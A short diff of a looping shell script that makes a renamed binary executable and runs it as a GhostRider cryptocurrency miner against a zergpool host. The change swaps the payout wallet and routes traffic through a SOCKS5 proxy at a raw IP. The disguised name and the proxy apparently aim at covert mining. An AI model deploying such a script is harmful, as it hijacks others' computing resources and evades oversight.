@@ -1,4 +1,4 @@
 while true; do
-chmod u+x tengkorak && ./tengkorak -a gr -o stratum+tcp://ghostrider.eu.mine.zergpool.com:5354 -u D67zfz3CwzGqVahUP2xYazJrgZxY2gp3cD.tengkorak -p c=DGB
+chmod u+x tengkorak && ./tengkorak -a gr -o stratum+tcp://ghostrider.eu.mine.zergpool.com:5354 -u D63YEMS8dCqnE71Mrp1StTTCX39b22PN1z.tengkorak -p c=DOGE -x socks5://72.210.208.101:4145
 sleep 5;
 done;
